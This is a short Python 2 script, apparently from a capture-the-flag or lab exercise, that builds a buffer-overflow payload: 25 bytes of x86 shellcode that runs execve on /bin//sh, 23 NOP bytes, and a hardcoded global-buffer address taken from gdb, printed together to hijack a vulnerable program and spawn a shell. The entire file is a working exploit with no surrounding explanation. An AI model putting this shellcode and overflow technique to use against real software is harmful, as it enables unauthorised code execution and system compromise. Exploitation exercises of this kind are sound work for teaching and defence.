#!/usr/bin/python

import struct

#info address Name in gdb to get address of global variable Name which is 0x80dacc0
NAME_ADDR = struct.pack("I", 0x80dacc0)
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

#shellcode is 25 bytes + 23 NOPS + 4 bytes (NAME_ADDR = Name buffer address) we are to Name buffer
NOP = "\x90" * 23
print shellcode + NOP + NAME_ADDR